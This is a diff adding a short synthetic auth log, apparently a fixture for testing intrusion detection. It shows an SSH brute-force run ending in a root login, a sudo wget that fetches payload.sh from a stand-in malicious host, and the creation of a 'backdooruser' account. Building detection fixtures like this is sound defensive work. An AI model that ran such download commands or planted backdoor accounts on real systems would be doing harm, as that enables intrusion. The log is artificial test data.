@@ -1,0 +1,13 @@
+Jan 15 02:13:01 server sshd[1234]: Failed password for admin from 192.168.1.50 port 22 ssh2
+Jan 15 02:13:03 server sshd[1234]: Failed password for admin from 192.168.1.50 port 22 ssh2
+Jan 15 02:13:05 server sshd[1234]: Failed password for root from 192.168.1.50 port 22 ssh2
+Jan 15 02:13:07 server sshd[1234]: Failed password for admin from 192.168.1.50 port 22 ssh2
+Jan 15 02:13:09 server sshd[1234]: Failed password for admin from 192.168.1.50 port 22 ssh2
+Jan 15 02:13:11 server sshd[1234]: Failed password for admin from 192.168.1.50 port 22 ssh2
+Jan 15 02:13:13 server sshd[1234]: Failed password for admin from 192.168.1.50 port 22 ssh2
+Jan 15 02:13:15 server sshd[1234]: Failed password for admin from 192.168.1.50 port 22 ssh2
+Jan 15 02:15:00 server sshd[1234]: Accepted password for root from 192.168.1.50 port 22 ssh2
+Jan 15 02:15:01 server sshd[1234]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Jan 15 09:00:01 server sudo[5678]: jdoe : TTY=pts/0 ; PWD=/home/jdoe ; USER=root ; COMMAND=/usr/bin/wget http://malicious.example.com/payload.sh
+Jan 15 11:30:00 server useradd[9999]: new user: name=backdooruser, UID=1337, GID=1337
+Jan 15 14:00:00 server sshd[2222]: Accepted password for jdoe from 10.0.0.15 port 22 ssh2
